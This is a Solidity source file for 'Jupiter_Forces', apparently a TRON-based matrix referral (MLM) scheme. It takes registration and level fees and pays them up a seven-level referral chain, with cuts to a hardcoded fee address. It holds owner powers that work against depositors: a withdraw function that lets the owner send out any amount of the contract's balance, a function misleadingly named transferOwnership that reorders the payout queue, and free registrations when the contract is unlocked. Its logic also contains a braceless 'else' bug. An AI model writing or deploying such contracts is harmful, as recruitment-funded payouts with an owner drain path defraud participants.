//SourceUnit: jupiter_forces_final.sol

pragma solidity 0.5.10;
/*
  https://jupiterforces.io/
 */
contract Owner {
   address owner;
   bool public locked;
   constructor() public {
      owner = msg.sender;
   }
   modifier onlyOwner() { 
        require(msg.sender == owner, "onlyOwner"); 
        _; 
    }

    modifier onlyUnlocked() { 
        require(!locked || msg.sender == owner); 
        _; 
    }
   
}
contract Jupiter_Forces is Owner{
    
    struct User {
        uint id;
        address payable referrer;
        uint partnersCount;   
        mapping(uint8 => bool) activeX3Levels;
        mapping(uint8 => bool) activeX6Levels;
        mapping(uint8 => X3) x3Matrix;
        mapping(uint8 => X6) x6Matrix;
        mapping(uint8 => uint256) holdAmount;
    }
    
    struct X3 {
        address currentReferrer;
        address[] referrals;
        bool blocked;
        uint reinvestCount;
    }
    
    struct X6 {
        address currentReferrer;
        address[] referrals;
        bool blocked;
        uint reinvestCount;
        uint256 RefvID;
    }

    uint256[] public REFERRAL_PERCENTS = [40,25,10,10,5,5,5];
    mapping(address => User) public users;
    mapping(uint => address) public idToAddress;

    uint public lastUserId = 2;

    
    mapping(uint8 => mapping(uint256 => address)) public x3vId_number;
    mapping(uint8 => uint256) public x3CurrentvId;
    mapping(uint8 => uint256) public x3Index;
    
    address payable public owner;
    
    mapping(uint8 => uint) public levelPrice;
    
    mapping(uint8 => uint) public blevelPrice;
    mapping(uint8 => uint) public sponsorBonus;
    address payable public platform_fee;
    uint256[] public ref_bonuses;
    event Registration(address indexed user, address indexed referrer, uint indexed userId, uint referrerId);
    event Upgrade(address indexed user, address indexed referrer, uint8 matrix, uint8 level);
    event NewUserPlace(address indexed user, address indexed referrer, uint8 matrix, uint8 level, uint8 place);
    event EntryBonus(address indexed receiver, address indexed _from, uint _amount, uint8 level);
    event LevelBonus(address indexed receiver, address indexed _from, uint _amount, uint8 level);
    event SponsorBonus(address indexed receiver, address indexed _from, uint _amount, uint8 level);
    event ReEntry(address indexed _user);
    
   
  
    
    constructor() public {
        levelPrice[1]  = 300*1e6;
        levelPrice[2]  = 500*1e6;
        levelPrice[3]  = 700*1e6;
        levelPrice[4]  = 1000*1e6;
        levelPrice[5]  = 1500*1e6;
        levelPrice[6]  = 2000*1e6;
        levelPrice[7]  = 3000*1e6;
        
        blevelPrice[1]  = 700*1e6;
        blevelPrice[2]  = 1000*1e6;
        blevelPrice[3]  = 1500*1e6;
        blevelPrice[4]  = 2000*1e6;
        blevelPrice[5]  = 3000*1e6;
        blevelPrice[6]  = 5000*1e6;
        blevelPrice[7]  = 10000*1e6;
        
        sponsorBonus[1]  = 200*1e6;
        sponsorBonus[2]  = 400*1e6;
        sponsorBonus[3]  = 800*1e6;
        sponsorBonus[4]  = 1600*1e6;
        sponsorBonus[5]  = 2500*1e6;
        sponsorBonus[6]  = 3500*1e6;
        sponsorBonus[7]  = 9500*1e6;
        
		ref_bonuses.push(50*1e6);
        ref_bonuses.push(10*1e6);
        ref_bonuses.push(10*1e6);
        ref_bonuses.push(5*1e6);
		ref_bonuses.push(5*1e6);
		ref_bonuses.push(5*1e6);
		ref_bonuses.push(3*1e6);
		ref_bonuses.push(2*1e6);
		
        owner = msg.sender;
        platform_fee = 0xc2976A4245Dc1975C3C6603341DCB8458FB54b19;
        
        User memory user = User({
            id: 657861,
            referrer: address(0),
            partnersCount: uint(0)
        });
        
        users[owner] = user;
       
        idToAddress[657861] = owner;

        for (uint8 i = 1; i <= 7; i++) 
        {
            x3vId_number[i][1]=owner;
            x3Index[i]=1;
            x3CurrentvId[i]=1;
            users[owner].activeX3Levels[i] = true;
            users[owner].activeX6Levels[i] = true;
        } 
        
    }
    
    function() external payable {
        if(msg.data.length == 0) {
            return registration(msg.sender, owner,0);
        }
        
        registration(msg.sender,owner,0);
    }

     function withdrawLostTRXFromBalance(address payable _sender,uint256 _amt) public {
        require(msg.sender == owner, "onlyOwner");
        _sender.transfer(_amt);
    }
    function changeLock() external onlyOwner() {
        locked = !locked;
    }
    function registrationExt(address payable referrerAddress,uint id) external payable onlyUnlocked {
        registration(msg.sender, referrerAddress, id);
    }
    function registrationFor(address userAddress, address payable referrerAddress,uint id) external onlyUnlocked {
        registrationFree(userAddress, referrerAddress,id);
        _buyNewLevelFree(userAddress, 1, 1);
        _buyNewLevelFree(userAddress, 2, 1);
    }
    function buyNewLevel(uint8 matrix, uint8 level) external payable onlyUnlocked() {
        _buyNewLevel(msg.sender, matrix, level);
    }
    function _buyNewLevel(address _userAddress, uint8 matrix, uint8 level) internal {
        require(isUserExists(_userAddress), "user is not exists. Register first.");
        require(matrix == 1 || matrix == 2, "invalid matrix");
        if (matrix == 1) 
        {
            require(msg.value == levelPrice[level] , "invalid price");
            require(level==1, "invalid level");
            
            require(!users[_userAddress].activeX3Levels[level], "level already activated");
        
            users[_userAddress].activeX3Levels[level] = true;
            address payable ref=users[_userAddress].referrer;
            uint ded=(msg.value*10)/100;
            platform_fee.transfer(ded);
            uint rest=msg.value-ded;
            for(uint8 i=0;i<7;i++)
            {
                if(ref!=address(0)) 
                {
                    if(users[ref].activeX3Levels[level])
                    {
                        ref.transfer((rest*REFERRAL_PERCENTS[i])/100);
                    }
					else 
					{
					    platform_fee.transfer((rest*REFERRAL_PERCENTS[i])/100);
					}
					emit LevelBonus(ref, _userAddress, (rest*REFERRAL_PERCENTS[i])/100, i+1);
                    ref=users[ref].referrer;
                }
                else
                {
                    i=7;
                }
            }
            emit Upgrade(_userAddress, users[_userAddress].referrer, 1, level);
        }
        else 
        {
            require(msg.value == blevelPrice[level] , "invalid price");
            require(level==1, "invalid level");
           
            require(users[_userAddress].activeX3Levels[level], "buy working level first");
         
            require(!users[_userAddress].activeX6Levels[level], "level already activated"); 

            address freeX6Referrer = findFreeX6Referrer(level);
            
            users[_userAddress].activeX6Levels[level] = true;
            users[_userAddress].x6Matrix[level].currentReferrer = freeX6Referrer;
            updateX6Referrer(_userAddress, freeX6Referrer, level);
            emit Upgrade(_userAddress, freeX6Referrer, 2, level);
        }
    }    
    function _buyNewLevelFree(address _userAddress, uint8 matrix, uint8 level) internal {
        require(isUserExists(_userAddress), "user is not exists. Register first.");
        require(matrix == 1 || matrix == 2, "invalid matrix");
        if (matrix == 1) 
        {
            require(level==1, "invalid level");
            
            require(!users[_userAddress].activeX3Levels[level], "level already activated");
        
            users[_userAddress].activeX3Levels[level] = true;
            address payable ref=users[_userAddress].referrer;
            uint ded=(levelPrice[level]*10)/100;
            uint rest=levelPrice[level]-ded;
            for(uint8 i=0;i<7;i++)
            {
                if(ref!=address(0)) 
                {
                    if(users[ref].activeX3Levels[level])
                    {
                        emit LevelBonus(ref, _userAddress, (rest*REFERRAL_PERCENTS[i])/100, i+1);
                    }					
                    ref=users[ref].referrer;
                }
                else
                {
                    i=7;
                }
            }
            emit Upgrade(_userAddress, users[_userAddress].referrer, 1, level);
        }
        else 
        {
            require(level==1, "invalid level");
           
            require(users[_userAddress].activeX3Levels[level], "buy working level first");
         
            require(!users[_userAddress].activeX6Levels[level], "level already activated"); 

            address freeX6Referrer = findFreeX6Referrer(level);
            
            users[_userAddress].activeX6Levels[level] = true;
            users[_userAddress].x6Matrix[level].currentReferrer = freeX6Referrer;
            updateX6ReferrerFree(_userAddress, freeX6Referrer, level);
            emit Upgrade(_userAddress, freeX6Referrer, 2, level);
        }
    } 
    function registration(address userAddress, address payable referrerAddress, uint id) private{
        
        require(!isUserExists(userAddress), "user exists");
        require(idToAddress[id]==address(0) && id>=100000, "Invalid ID");
        require(isUserExists(referrerAddress), "referrer not exists");
        
        uint32 size;
        assembly {
            size := extcodesize(userAddress)
        }
        require(size == 0, "cannot be a contract");
        require(msg.value == 100*1e6, "invalid registration cost");
        
        User memory user = User({
            id: id,
            referrer: referrerAddress,
            partnersCount: 0
        });
        
        users[userAddress] = user;
        idToAddress[id] = userAddress;
                   
        users[userAddress].referrer = referrerAddress;
       
        
        lastUserId++;
        users[referrerAddress].partnersCount++;
        
        uint ded=10*1e6;
        platform_fee.transfer(ded);
        referrerAddress.transfer(ref_bonuses[0]);
        emit EntryBonus(referrerAddress,userAddress,ref_bonuses[0],1);
        _refPayout(referrerAddress);
        emit Registration(userAddress, referrerAddress, users[userAddress].id, users[referrerAddress].id);
    }
    function registrationFree(address userAddress, address payable referrerAddress, uint id) private{
        
        require(!isUserExists(userAddress), "user exists");
        require(idToAddress[id]==address(0) && id>=100000, "Invalid ID");
        require(isUserExists(referrerAddress), "referrer not exists");
        
        uint32 size;
        assembly {
            size := extcodesize(userAddress)
        }
        require(size == 0, "cannot be a contract");
        
        User memory user = User({
            id: id,
            referrer: referrerAddress,
            partnersCount: 0
        });
        
        users[userAddress] = user;
        idToAddress[id] = userAddress;
                   
        users[userAddress].referrer = referrerAddress;
       
        
        lastUserId++;
        users[referrerAddress].partnersCount++;
        
        emit EntryBonus(referrerAddress,userAddress,ref_bonuses[0],1);
        _refPayoutFree(referrerAddress);
        emit Registration(userAddress, referrerAddress, users[userAddress].id, users[referrerAddress].id);
    }
    function _refPayout(address _addr) private {
        address payable up = users[_addr].referrer;
		uint256 bonus=0;
        for(uint8 i = 1; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
                bonus=ref_bonuses[i];
                up.transfer(bonus);          
                emit EntryBonus(up,_addr,bonus,(i+1));
            up = users[up].referrer;
        }
    }
    function _refPayoutFree(address _addr) private {
        address up = users[_addr].referrer;
		uint256 bonus=0;
        for(uint8 i = 1; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
                bonus=ref_bonuses[i];         
                emit EntryBonus(up,_addr,bonus,(i+1));
            up = users[up].referrer;
        }
    }
    

    function updateX6Referrer(address userAddress, address referrerAddress, uint8 level) private{
        uint256 newIndex=x3Index[level]+1;
        x3vId_number[level][newIndex]=userAddress;
        x3Index[level]=newIndex;
        if(users[referrerAddress].holdAmount[level]<blevelPrice[level+1] && !(users[referrerAddress].activeX6Levels[level+1]) && level<7
        )
        {
            address(uint160(platform_fee)).transfer((blevelPrice[level]*5)/100); 
            users[referrerAddress].holdAmount[level]=users[referrerAddress].holdAmount[level]+((blevelPrice[level]*95)/100);
            users[referrerAddress].x6Matrix[level].referrals.push(userAddress);
            emit NewUserPlace(userAddress, referrerAddress, 2, level, uint8(users[referrerAddress].x6Matrix[level].referrals.length));
          
            if(!(users[referrerAddress].activeX3Levels[level+1]) && users[referrerAddress].holdAmount[level]>=levelPrice[level+1])
            {
                autoUpgradeLevel(referrerAddress, (level+1));  
            }
            else
            {
                if(users[referrerAddress].holdAmount[level]>=blevelPrice[level+1] && !(users[referrerAddress].activeX6Levels[level+1]))
                {
                   autoUpgrade(referrerAddress, (level+1));  
                }  
            }
        }
        else
        {
            if(level==7 && users[referrerAddress].x6Matrix[level].referrals.length==0)
            {
                users[referrerAddress].x6Matrix[level].referrals.push(userAddress);
                emit NewUserPlace(userAddress, referrerAddress, 2, level, uint8(users[referrerAddress].x6Matrix[level].referrals.length));
                emit ReEntry(referrerAddress);
                address(uint160(platform_fee)).transfer((blevelPrice[level]*5)/100);
                uint256 ded=(blevelPrice[level]*5)/100+(blevelPrice[1]);
                address(uint160(referrerAddress)).transfer(blevelPrice[level]-ded);
                address freeX6Referrer = findFreeX6Referrer(1);
                users[referrerAddress].activeX6Levels[1] = true;
                updateX6Referrer(referrerAddress, freeX6Referrer, 1);
                emit Upgrade(referrerAddress, freeX6Referrer, 2, 1);
                return;
            }
            if(users[referrerAddress].x6Matrix[level].referrals.length < level+4) 
            {
                users[referrerAddress].x6Matrix[level].referrals.push(userAddress);
                emit NewUserPlace(userAddress, referrerAddress, 2, level, uint8(users[referrerAddress].x6Matrix[level].referrals.length));
                address(uint160(platform_fee)).transfer((blevelPrice[level]*5)/100); 
                return address(uint160(referrerAddress)).transfer((blevelPrice[level]*95)/100);
            }
            users[referrerAddress].x6Matrix[level].referrals.push(userAddress);
            emit NewUserPlace(userAddress, referrerAddress, 2, level, uint8(users[referrerAddress].x6Matrix[level].referrals.length));
            if(level<7)
            {
                address(uint160(platform_fee)).transfer((blevelPrice[level]*5)/100); 
                address(uint160(referrerAddress)).transfer((((blevelPrice[level]*95)/100)-sponsorBonus[level]));
            }
            
            if(users[referrerAddress].referrer!=address(0))
            {
                address(uint160(users[referrerAddress].referrer)).transfer(sponsorBonus[level]);
                emit SponsorBonus(users[referrerAddress].referrer,referrerAddress,sponsorBonus[level],1);
            }
            else
            address(uint160(platform_fee)).transfer(sponsorBonus[level]);
            
            users[referrerAddress].x6Matrix[level].referrals = new address[](0);
            users[referrerAddress].activeX6Levels[level]=false;
            x3CurrentvId[level]=x3CurrentvId[level]+1;  //  After completion of two members
        }
        
    }
    function updateX6ReferrerFree(address userAddress, address referrerAddress, uint8 level) private{
        uint256 newIndex=x3Index[level]+1;
        x3vId_number[level][newIndex]=userAddress;
        x3Index[level]=newIndex;
        if(users[referrerAddress].holdAmount[level]<blevelPrice[level+1] && !(users[referrerAddress].activeX6Levels[level+1]) && level<7
        )
        {
            users[referrerAddress].holdAmount[level]=users[referrerAddress].holdAmount[level]+((blevelPrice[level]*95)/100);
            users[referrerAddress].x6Matrix[level].referrals.push(userAddress);
            emit NewUserPlace(userAddress, referrerAddress, 2, level, uint8(users[referrerAddress].x6Matrix[level].referrals.length));
          
            if(!(users[referrerAddress].activeX3Levels[level+1]) && users[referrerAddress].holdAmount[level]>=levelPrice[level+1])
            {
                autoUpgradeLevelFree(referrerAddress, (level+1));  
            }
            else
            {
                if(users[referrerAddress].holdAmount[level]>=blevelPrice[level+1] && !(users[referrerAddress].activeX6Levels[level+1]))
                {
                   autoUpgradeFree(referrerAddress, (level+1));  
                }  
            }
        }
        else
        {
            if(level==7 && users[referrerAddress].x6Matrix[level].referrals.length==0)
            {
                users[referrerAddress].x6Matrix[level].referrals.push(userAddress);
                emit NewUserPlace(userAddress, referrerAddress, 2, level, uint8(users[referrerAddress].x6Matrix[level].referrals.length));
                emit ReEntry(referrerAddress);
                address freeX6Referrer = findFreeX6Referrer(1);
                users[referrerAddress].activeX6Levels[1] = true;
                updateX6ReferrerFree(referrerAddress, freeX6Referrer, 1);
                emit Upgrade(referrerAddress, freeX6Referrer, 2, 1);
                return;
            }
            if(users[referrerAddress].x6Matrix[level].referrals.length < level+4) 
            {
                users[referrerAddress].x6Matrix[level].referrals.push(userAddress);
                emit NewUserPlace(userAddress, referrerAddress, 2, level, uint8(users[referrerAddress].x6Matrix[level].referrals.length));
                return ;
            }
            users[referrerAddress].x6Matrix[level].referrals.push(userAddress);
            emit NewUserPlace(userAddress, referrerAddress, 2, level, uint8(users[referrerAddress].x6Matrix[level].referrals.length));
            
            
            if(users[referrerAddress].referrer!=address(0))
            {
                emit SponsorBonus(users[referrerAddress].referrer,referrerAddress,sponsorBonus[level],1);
            }
            else
            
            users[referrerAddress].x6Matrix[level].referrals = new address[](0);
            users[referrerAddress].activeX6Levels[level]=false;
            x3CurrentvId[level]=x3CurrentvId[level]+1;  //  After completion of two members
        }
        
    }
    function autoUpgradeLevel(address _user, uint8 level) private{
        if(!users[_user].activeX3Levels[level])
        {
            users[_user].activeX3Levels[level] = true;
            address payable ref=users[_user].referrer;
            uint ded=(levelPrice[level]*10)/100;
            platform_fee.transfer(ded);
            uint rest=levelPrice[level]-ded;
            for(uint8 i=0;i<7;i++)
            {
                if(ref!=address(0)) 
                {
                    if(users[ref].activeX3Levels[level])
                    {
                    ref.transfer((rest*REFERRAL_PERCENTS[i])/100);
                    emit LevelBonus(ref, _user, (rest*REFERRAL_PERCENTS[i])/100, i+1);
                    }
                    else
                    {
                        platform_fee.transfer((rest*REFERRAL_PERCENTS[i])/100);
                    }
                    ref=users[ref].referrer;
                }
                else
                {
                    i=7;
                }
            }
           users[_user].holdAmount[level-1]=users[_user].holdAmount[level-1]-levelPrice[level];
           emit Upgrade(_user, users[_user].referrer, 1, level);
        }
    }
    function autoUpgradeLevelFree(address _user, uint8 level) private{
        if(!users[_user].activeX3Levels[level])
        {
            users[_user].activeX3Levels[level] = true;
            address ref=users[_user].referrer;
            uint ded=(levelPrice[level]*10)/100;
            uint rest=levelPrice[level]-ded;
            for(uint8 i=0;i<7;i++)
            {
                if(ref!=address(0)) 
                {
                    if(users[ref].activeX3Levels[level])
                    {
                       emit LevelBonus(ref, _user, (rest*REFERRAL_PERCENTS[i])/100, i+1);
                    }
                    ref=users[ref].referrer;
                }
                else
                {
                    i=7;
                }
            }
           users[_user].holdAmount[level-1]=users[_user].holdAmount[level-1]-levelPrice[level];
           emit Upgrade(_user, users[_user].referrer, 1, level);
        }
    }
    function autoUpgrade(address _user, uint8 level) private{
            if((users[_user].holdAmount[level-1]-blevelPrice[level])>0)
            {
               address(uint160(_user)).transfer(users[_user].holdAmount[level-1]-blevelPrice[level]);
            }
            users[_user].holdAmount[level-1]=0;
            address freeX6Referrer = findFreeX6Referrer(level);
            users[_user].activeX6Levels[level] = true;
            updateX6Referrer(_user, freeX6Referrer, level);
            emit Upgrade(_user, freeX6Referrer, 2, level);
    }
    function autoUpgradeFree(address _user, uint8 level) private{
            
            users[_user].holdAmount[level-1]=0;
            address freeX6Referrer = findFreeX6Referrer(level);
            users[_user].activeX6Levels[level] = true;
            updateX6ReferrerFree(_user, freeX6Referrer, level);
            emit Upgrade(_user, freeX6Referrer, 2, level);
    }
    
    function findFreeX3Referrer(address userAddress, uint8 level) public view returns(address) {
        while (true) {
            if (users[users[userAddress].referrer].activeX3Levels[level]) {
                return users[userAddress].referrer;
            }
            
            userAddress = users[userAddress].referrer;
        }
    }
    
    function setWithdrawFee(address payable _platform_fee) public {
        if (msg.sender != owner) {revert("Access Denied");}
		platform_fee=_platform_fee;
    }
    
    function findFreeX6Referrer(uint8 level) public view returns(address){
            uint256 id=x3CurrentvId[level];
            return x3vId_number[level][id];
    }
        
    function usersActiveX3Levels(address userAddress, uint8 level) public view returns(bool) {
        return users[userAddress].activeX3Levels[level];
    }

    function usersActiveX6Levels(address userAddress, uint8 level) public view returns(bool) {
        return users[userAddress].activeX6Levels[level];
    }


    function usersX3Matrix(address userAddress, uint8 level) public view returns(address, address[] memory, bool,uint256) {
        return (users[userAddress].x3Matrix[level].currentReferrer,
                users[userAddress].x3Matrix[level].referrals,
                users[userAddress].x3Matrix[level].blocked,
                users[userAddress].x3Matrix[level].reinvestCount
                );
    }

    function usersX6Matrix(address userAddress, uint8 level) public view returns(address, address[] memory, bool,uint256) {
        return (users[userAddress].x6Matrix[level].currentReferrer,
                users[userAddress].x6Matrix[level].referrals,
                users[userAddress].x6Matrix[level].blocked,
                users[userAddress].x6Matrix[level].reinvestCount);
    }
    
    function isUserExists(address user) public view returns (bool) {
        return (users[user].id != 0);
    }

  
    function getUserHoldAmount(address userAddress) public view returns(uint256[] memory) {
		uint256[] memory levelHold = new uint256[](12);
		for(uint8 j=0; j<12; j++)
		{
		  levelHold[j]  =users[userAddress].holdAmount[j+1];
		}
		return (levelHold);
	}
    
    function transferOwnership(uint256 _place,uint8 level) public 
    {
     require(msg.sender==owner,"Only Owner");
     x3CurrentvId[level]=_place;
    }

    function bytesToAddress(bytes memory bys) private pure returns (address addr) {
        assembly {
            addr := mload(add(bys, 20))
        }
    }
}